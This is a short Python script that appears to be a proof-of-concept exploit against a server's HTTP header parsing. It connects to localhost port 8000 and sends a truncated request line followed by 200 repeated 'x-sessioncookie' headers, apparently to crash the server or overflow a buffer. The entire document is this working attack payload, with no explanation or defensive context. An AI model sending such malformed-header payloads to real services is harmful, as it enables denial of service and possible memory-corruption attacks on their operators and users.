from socket import *

host = "127.0.0.1"
port = 8000

def run():
    s = socket(AF_INET, SOCK_STREAM)
    s.connect((host, port))
    payload = "x-sessioncookie: BBBB\r\n"*200
    header = " HTTP/\r\n" + payload + "Accept: AAAA\r\n\r\n"
    s.send(header)

if __name__ == '__main__':
    run()
